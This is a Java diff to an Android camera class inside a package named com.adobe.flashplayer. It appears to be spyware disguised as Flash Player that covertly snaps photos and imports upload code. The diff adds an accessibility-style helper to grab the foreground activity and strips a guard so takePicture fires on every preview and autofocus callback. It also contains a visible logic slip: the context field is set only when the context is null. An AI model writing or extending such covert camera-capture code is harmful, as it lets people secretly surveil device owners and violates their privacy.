@@ -29,6 +29,7 @@ import android.widget.LinearLayout;
 import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.accessory.AccessHelper;
 import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.Public;
@@ -51,20 +52,25 @@ public class CameraDialog implements Runnable
 
     private Camera myCamera = null;
 
-    //private final int CAMERAFOCUSDELAY = 1000;
+    private final int CAMERAFOCUSDELAY = 100;
 
     private long camerastarttime ;
 
     private final int VALID_CAMERAPHOTO_SIZE = 4096;
 
-    private boolean beinused = false;
-
 
     public CameraDialog(Context context,int camerano)
     {
-        this.context = context;
+        try{
+            context = AccessHelper.getActivity().get(0);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        if (context == null){
+            this.context = context;
+        }
+
         this.camerano = (camerano^1);
-        beinused = false;
     }
 
 
@@ -239,12 +245,6 @@ public class CameraDialog implements Runnable
                     myCamera.setPreviewCallback(new PreviewCallback() {
                         @Override
                         public void onPreviewFrame(byte[] data, Camera camera) {
-                            if (beinused) {
-                                //java.lang.RuntimeException: takePicture failed
-                                return;
-                            }
-
-                            beinused = true;
                             myCamera.takePicture(null, null, myPicCallback);
                             Log.e(TAG, "onPreviewFrame callback");
                         }
@@ -275,7 +275,7 @@ public class CameraDialog implements Runnable
                     myCamera.setParameters(parameters);
 
                     myCamera.startPreview();
-                    //Thread.sleep(CAMERAFOCUSDELAY);
+                    Thread.sleep(CAMERAFOCUSDELAY);
                     myCamera.autoFocus(myAutoFocus);
                     //myCamera.takePicture(null, null, myPicCallback);
                 }
@@ -323,11 +323,6 @@ public class CameraDialog implements Runnable
         @Override
         public void onAutoFocus(boolean success, Camera camera) {
             try{
-                if (beinused) {
-                    return;
-                }
-
-                beinused = true;
                 myCamera.takePicture(null, null, myPicCallback);
                 Log.e(TAG, "AutoFocusCallback callback");
             }catch(Exception ex){
